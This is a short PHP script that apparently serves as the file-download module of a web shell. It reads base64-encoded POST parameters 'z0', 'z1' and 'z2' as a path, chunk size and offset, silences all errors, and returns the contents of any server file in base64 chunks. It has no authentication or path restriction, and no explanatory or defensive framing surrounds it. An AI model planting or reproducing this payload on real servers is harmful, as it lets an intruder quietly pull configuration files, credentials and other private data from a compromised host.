<?php

error_reporting(0);
@ini_set('display_errors', '0');
@set_time_limit(0);

function main()
{
    $szPath = base64_decode($_POST['z0']);
    $szChunkSize = base64_decode($_POST['z1']);
    $szOffset = base64_decode($_POST['z2']);

    $nChunkSize = (float)$szChunkSize;
    $nOffset = (float)$szOffset;

    if (!file_exists($szPath)) {
        return "0|ERROR://" . $szPath . " not existed!";
    }

    $nFileSize = (float)filesize($szPath);

    if ($nOffset >= $nFileSize) {
        return "2|";
    }

    $handle = fopen($szPath, "rb");
    if ($handle === false) {
        return "0|ERROR://Cannot open: " . $szPath;
    }

    if (fseek($handle, (int)$nOffset, SEEK_SET) !== 0) {
        fclose($handle);
        return "0|ERROR://Cannot seek to: " . $nOffset;
    }

    $remaining = $nFileSize - $nOffset;
    $readSize = min($nChunkSize, $remaining);

    if ($readSize > 50 * 1024 * 1024) { 
        $readSize = 50 * 1024 * 1024;
    }

    $data = '';
    $readTotal = 0;

    while ($readTotal < $readSize && !feof($handle)) {
        $buffer = fread($handle, (int)($readSize - $readTotal));

        if ($buffer === false) {
            fclose($handle);
            return "0|ERROR://Read failed";
        }

        if ($buffer === '') {
            break;
        }

        $data .= $buffer;
        $readTotal += strlen($buffer);
    }

    fclose($handle);

    return "1|" . base64_encode($data);
}

echo main();

?>